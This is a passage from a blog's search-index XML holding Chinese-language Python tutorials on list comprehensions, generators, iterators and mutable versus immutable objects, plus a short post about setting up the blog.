        <content type="html"><![CDATA[<h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p>我们都知道python中有一大特性就是列表生成式，英文名 List Comprehension（之前面试的时候被问到我说没听说过，直到面试官说列表生成式的时候才反应过来。尴尬 - _ -||| ）。基本格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i for i in (iterable)]</span><br></pre></td></tr></table></figure><h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>列表生成器会返回一个列表，然而其会受到内存限制，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i for i in range(10000**10000)]</span><br></pre></td></tr></table></figure><p>上式内存直接爆炸。</p><p>所以 python 中引入一种一边迭代一边计算的机制，叫做<b>生成器（generator）</b>。<br>在 Python 中，使用了 <b>yield</b> 的函数被称为生成器（generator）。在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</p><p>要创建一个generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的[]改成()，就创建了一个generator：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; g = (i for i in range(3))</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at 0x00000183E6523318&gt;</span><br><span class="line">&gt;&gt;&gt; for n in g:</span><br><span class="line">...     pass </span><br></pre></td></tr></table></figure><p>注意上式返回的是一个 generator，<b>并不是元组</b>。（面试时忘记此知识点，误以为()是元组操作会报错，然而返回的是一个生成器）。生成器也是一个<b>可迭代对象（iterable）</b>。</p><p>第二种方法可以使用函数 <strong>iter(obj)</strong> , 其中 obj 一定是一个 <strong>可迭代对象</strong> ，因为生成器本质上就是一个迭代器。</p><p>大多数生成器都有<strong>边界</strong>，即达到一个特定的条件，会返回 StopIteration，此错误类可以被 <code>except</code> 捕获。</p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>可以直接作用于 for 循环的对象被称为<strong>可迭代对象（iterable）</strong>。像是一些集合类数据类型如 string、list、set、dict、tuple等，还有生成器和带 yield 的生成器函数。判断一个对象是否可迭代，可以使用 isinstance() ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterable</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance((), Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance((i for i in range(10)), Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(&quot;abc&quot;, Iterable)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(123, Iterable)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>可以被<code>next()</code>函数调用并不断返回下一个值的对象称为迭代器：<code>Iterator</code>。可以使用<code>isinstance()</code>判断一个对象是否是Iterator对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterator</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&#123;&#125;, Iterator)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; isinstance(&#x27;abc&#x27;, Iterator)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>生成器都是 <code>Iterator</code> 对象，但 <code>list</code>、<code>dict</code>、<code>str</code> 虽然是 <code>Iterable</code>，却不是 <code>Iterator</code>。把list、dict、str等Iterable变成Iterator可以使用iter()函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(iter([]), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(iter(&#x27;abc&#x27;), Iterator)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>Python的Iterator对象表示的是一个数据流，Iterator对象可以被 <code>next()</code> 函数调用并不断返回下一个数据，直到没有数据时抛出 <code>StopIteration</code> 错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过next()函数实现按需计算下一个数据，所以Iterator的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p><p>Python的for循环本质上就是通过不断调用next()函数实现的，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in [1, 2, 3, 4, 5]:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>实际上完全等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">it = iter([1, 2, 3, 4, 5])</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        x = next(it)</span><br><span class="line">    except StopIteration:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>列表生成式：</strong> 返回一个固定大小的列表，收内存限制，容量有限。</li><li><strong>生成器：</strong> 一边循环一边计算，使用yield返回值函数，生成器不但可以作用于for循环，还可以被next()函数不断调用并返回下一个值，直到最后抛出StopIteration。</li><li><strong>迭代器：</strong> 可以被next()函数调用并不断返回下一个值，一个实现了iter方法的对象是可迭代的，一个实现next方法并且是可迭代的对象是迭代器。</li></ul><h2 id="对yield的总结"><a href="#对yield的总结" class="headerlink" title="对yield的总结"></a>对yield的总结</h2><ul><li>通常的for..in…循环中，in后面是一个数组，这个数组就是一个可迭代对象，类似的还有链表，字符串，文件。他可以是a = [1,2,3]，也可以是a = [x*x for x in range(3)]。它的缺点也很明显，就是所有数据都在内存里面，如果有海量的数据，将会非常耗内存。</li><li>生成器是可以迭代的，但是只可以读取它一次。因为用的时候才生成，比如a = (x*x for x in range(3))。!!!!注意这里是小括号而不是方括号。</li><li>生成器（generator）能够迭代的关键是他有next()方法，工作原理就是通过重复调用next()方法，直到捕获一个异常。</li><li>带有yield的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代</li><li>yield是一个类似return 的关键字，迭代一次遇到yield的时候就返回yield后面或者右面的值。而且下一次迭代的时候，从上一次迭代遇到的yield后面的代码开始执行</li><li>yield就是return返回的一个值，并且记住这个返回的位置。下一次迭代就从这个位置开始。</li><li>带有yield的函数不仅仅是只用于for循环，而且可用于某个函数的参数，只要这个函数的参数也允许迭代参数。</li><li>send()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。</li><li>send()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。</li><li>第一次调用时候必须先next（）或send（）,否则会报错，send后之所以为None是因为这时候没有上一个yield，所以也可以认为next（）等同于send(None)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论python的可变与不可变对象</title>
      <link href="/2021-08/%E8%AE%BApython%E7%9A%84%E5%8F%AF%E5%8F%98%E4%B8%8E%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021-08/%E8%AE%BApython%E7%9A%84%E5%8F%AF%E5%8F%98%E4%B8%8E%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p>我们都知道python中有一大特性就是列表生成式，英文名 List Comprehension（之前面试的时候被问到我说没听说过，直到面试官说列表生成式的时候才反应过来。尴尬 - _ -||| ）。基本格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i for i in (iterable)]</span><br></pre></td></tr></table></figure><h2 id="什么是可变-不可变对象"><a href="#什么是可变-不可变对象" class="headerlink" title="什么是可变/不可变对象"></a>什么是可变/不可变对象</h2><ul><li><b>不可变对象，即该对象所指向的内存中的值不能被改变。</b>当改变某个变量时候，由于其所指的值不能被改变，相当于把原来的值复制一份后再改变，这会开辟一个新的地址，变量再指向这个新的地址。</li><li><b>可变对象，该对象所指向的内存中的值可以被改变。</b>变量（准确的说是引用）改变后，实际上是其所指的值直接发生改变，并没有发生复制行为，也没有开辟新的出地址，通俗点说就是<b>原地改变</b>。</li></ul><p>在 python 的数据类型中，<font color="#F77567"><b>数值类型（int、float）、字符串str、元组tuple</b></font> 是<font color="#F77567"><b>不可变对象</b></font>。而<font color="#77C94B"><b>列表list、字典dict、集合set</b></font> 是<font color="#77C94B"><b>可变对象</b></font>。</p><h2 id="通过代码看变化"><a href="#通过代码看变化" class="headerlink" title="通过代码看变化"></a>通过代码看变化</h2><p>对于不可变对象来说，每次改变它的值，python都会开辟一个新的内存，将原值复制之后再改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = 1234</span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">1362244945808</span><br><span class="line">&gt;&gt;&gt; a -= 234</span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">1362245371952</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; b = &#x27;hello&#x27;</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">1362248686928</span><br><span class="line">&gt;&gt;&gt; b += &#x27;world&#x27;</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">1362248691120</span><br></pre></td></tr></table></figure><p>上面代码可以看见，不可变对象在每其值发生变化后，id 也发生变化，即变量指向的内存地址发生变化。</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/1578534351_20200109094056417_6270.png" alt="不可变对象"></p><p>而可变对象如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362245630600</span><br><span class="line">&gt;&gt;&gt; c.append(4)</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362245630600</span><br><span class="line">&gt;&gt;&gt; c += [5, 6, 7]</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362245630600</span><br></pre></td></tr></table></figure><p>可见可变对象的值在发生改变之后，其内存地址并不会发生变化，值的变化是直接在内存中改变的。引用也还是那个引用，内存也还是那个内存。<br><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/1578534353_20200109094205907_8395.png" alt="可变对象"></p><h2 id="令人懵逼的操作"><a href="#令人懵逼的操作" class="headerlink" title="令人懵逼的操作"></a>令人懵逼的操作</h2><p>可变对象和不可变对象是对于<b>直接引用的对象</b>来说的，即判断<b>原引用指向的地址值是否发生改变</b>。可以通过下面的例子来更深刻地理解这句话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">1362245631752</span><br><span class="line">&gt;&gt;&gt; id(a[0])</span><br><span class="line">140728500671520</span><br><span class="line">&gt;&gt;&gt; a[0] += 4</span><br><span class="line">&gt;&gt;&gt; id(a)       #a的id发生变化了吗？</span><br><span class="line">&gt;&gt;&gt; id(a[0])    #a[0]的id发生变化了吗？</span><br></pre></td></tr></table></figure><p>根据上面所说的，可以很容易的知道 a 的 id 并没有发生改变，因为 a 是一个 list 的引用，a所指向的内存保存的仍是 list 开始的地址。而 a[0] 的 id 却发生变化了，因为 a[0] 是一个 int 的引用，当它所指向的内存的值（1）发生变化后，python 会新开辟一个内存地址存放新的对象（5），并将它的地址反馈给a[0]。</p><p>再看另一个懵逼的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b = (1, 2, [3,4])</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">1362248603112</span><br><span class="line">&gt;&gt;&gt; id(b[2])</span><br><span class="line">1362248631816</span><br><span class="line">&gt;&gt;&gt; b[2].append(5)</span><br><span class="line">&gt;&gt;&gt; id(b[2])</span><br><span class="line">1362248631816</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">1362248603112</span><br></pre></td></tr></table></figure><p>b[2] 的 id 没有发生变化比较好理解，可是 b 不是一个tuple吗？刚才说了 tuple 是不可变对象，为什么它的值发生变化之后 id(b) 没有改变呢？这是因为 b 指向的内存地址值并没有发生改变，虽然 b[2] 从 [3, 4] 变为了 [3, 4, 5]，但由于 b[2] 本是一个可变对象，当它的内容改变后，b[2] 的地址值并没有发生变化，所以对于 b 来说，b 所指向的内存的地址值同样没有发生变化，因此python不会为它新建一个内存地址。即 b[2] 的变化对于 b 来说是透明的。</p><p>第三个懵逼操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362248710536</span><br><span class="line">&gt;&gt;&gt; c += [4]</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362248710536</span><br><span class="line">&gt;&gt;&gt; c = c + [5]</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1362245630600</span><br></pre></td></tr></table></figure><p>这又是什么操作？？？c 不是可变对象吗？为什么它的 id 一会儿变一会儿又不变（黑人问号脸）？？？这也是可以解释的：对于 c += [4] 来说，c 是二元运算符直接的操作对象，因此对于 c 这个可变对象来说，它的变化是在原有的内存中将值进行改变。但对于赋值操作来说就不一样了，等号右边的 c 还是原来的 c，但等号右边的 c 却是一个新开辟的 list 对象！因此 c = c + [5] 可以用下面的代码来解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = [1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; d = c + [5]</span><br><span class="line">&gt;&gt;&gt; c = d           # c = c + [5]</span><br><span class="line">&gt;&gt;&gt; id(c) == id(d)  #True or False?</span><br></pre></td></tr></table></figure><p>这就很好地解释了为什么经过赋值操作后 c 的 id 发生了变化。而后面的 id(c) 也肯定是等于 id(d) 的，因为此时 c 和 d 都指向了同一个 list 对象的地址！（因此在进行列表拷贝的时候，千万别用d=c 这种语法，因为d内容的改变会同时影响到c！）</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>begin</title>
      <link href="/2021-08/begin/"/>
      <url>/2021-08/begin/</url>
      
        <content type="html"><![CDATA[<p>通过一番调教，终于把博客基本的模型搭建好了。</p><p>博客是使用的 HEXO 框架，主题 <a href="https://butterfly.js.org/">Butterfly</a> ，比较符合自己的审美。</p><p>行こうよ~</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
